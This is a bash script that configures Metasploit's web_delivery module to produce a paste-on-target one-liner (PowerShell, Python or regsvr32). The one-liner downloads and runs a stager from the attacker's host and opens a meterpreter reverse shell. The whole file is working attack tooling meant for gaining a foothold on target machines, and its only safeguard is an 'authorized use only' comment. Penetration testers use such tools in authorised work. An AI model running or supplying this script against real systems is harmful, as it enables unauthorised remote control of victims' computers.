#!/usr/bin/env bash
#
# web-delivery.sh - Metasploit web_delivery one-liner generator
# -----------------------------------------------------------------------------
# Stands up exploit/multi/script/web_delivery so you get a single PowerShell /
# Python / regsvr32 one-liner that pulls and runs a stager from your box - the
# fastest "paste this on the target" foothold during an engagement.
# Prints the matching listener and starts msfconsole with everything pre-set.
# -----------------------------------------------------------------------------
# AUTHORIZED USE ONLY.
# -----------------------------------------------------------------------------
#
# USAGE:
#   ./web-delivery.sh -l <LHOST> -p <LPORT> [-t psh|python|regsvr32] [-P <payload>]
#
# EXAMPLES:
#   ./web-delivery.sh -l 10.10.14.3 -p 8443
#   ./web-delivery.sh -l 10.10.14.3 -p 8443 -t python -P python/meterpreter/reverse_tcp
#
# DEPENDENCIES: msfconsole
# -----------------------------------------------------------------------------

set -euo pipefail
c_info(){ printf '\033[1;34m[*]\033[0m %s\n' "$*"; }
c_ok(){   printf '\033[1;32m[+]\033[0m %s\n' "$*"; }
c_err(){  printf '\033[1;31m[-]\033[0m %s\n' "$*" >&2; }
have(){ command -v "$1" >/dev/null 2>&1; }

LHOST="" LPORT="" TGT="psh" PAYLOAD=""
usage(){ sed -n '2,20p' "$0"; exit 1; }
while getopts "l:p:t:P:h" o; do case "$o" in
  l) LHOST=$OPTARG;; p) LPORT=$OPTARG;; t) TGT=$OPTARG;; P) PAYLOAD=$OPTARG;; *) usage;;
esac; done
[ -z "$LHOST" ] || [ -z "$LPORT" ] && { usage; }
have msfconsole || { c_err "msfconsole not found"; exit 1; }

# map target type -> web_delivery TARGET index + default payload
case "$TGT" in
  psh)      TIDX=2; DEF="windows/x64/meterpreter/reverse_tcp";;
  python)   TIDX=0; DEF="python/meterpreter/reverse_tcp";;
  regsvr32) TIDX=3; DEF="windows/x64/meterpreter/reverse_tcp";;
  *) c_err "type must be psh|python|regsvr32"; exit 1;;
esac
PAYLOAD=${PAYLOAD:-$DEF}
c_ok "web_delivery: target=$TGT payload=$PAYLOAD on $LHOST:$LPORT"
c_info "msfconsole will print the one-liner to run on the target. Ctrl-C to stop."
exec msfconsole -q -x "use exploit/multi/script/web_delivery; set TARGET $TIDX; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; set SRVHOST $LHOST; exploit"
